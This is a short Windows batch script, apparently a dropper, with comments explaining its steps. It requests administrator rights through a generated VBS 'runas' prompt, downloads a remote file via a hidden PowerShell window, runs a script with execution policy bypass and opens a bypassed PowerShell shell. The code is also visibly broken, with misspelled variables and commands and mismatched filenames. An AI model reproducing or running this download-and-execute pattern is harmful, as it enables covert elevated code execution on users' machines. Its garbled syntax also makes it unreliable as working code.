Rem This script will get administrative permissions for the script it is going to download from the internet.
@echo off

IF %PROCESSOR-ARCHITECTURE% EQU "amd64"(
    >nul 2>&1 "SysWOW64/cacls.exe"
    "%SYSTEMROOT%\SysWOW64\config\system"
)

ELSE(
    >nul 2>&1 "system32/cacls.exe"
    "%SYSTEMROOT%\system32\config\system"
)

Rem we have to remove the error flag as it denies the admin privileges

if %errorlevel% NEQ '0'(
    echo Requesting administrative privileges
    goto UACPrompt
)
else (goto gotAdmin)


:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > %temp%\getadmin.vbs
    set params= %*
    echo UAC.ShellExecute "cmd.exe","/c ""%~s0"" %params:"= ""%","","runas",1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


powershell powershell.exe -windowstyle hidden "Invoke Web-Request -Uri https://jupiter.challenges.picoctf.org/static/717467c8c8b4332ea5873ad8fe7b2dad/test.S -OutFile install.ps1"
@rem here we will download the installer.ps1 file

powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"





Rem now we will remove the powershell to get an admin command prompt window

start powershell -ep bypass 
Rem this is to bypass all the execution policies on the shell
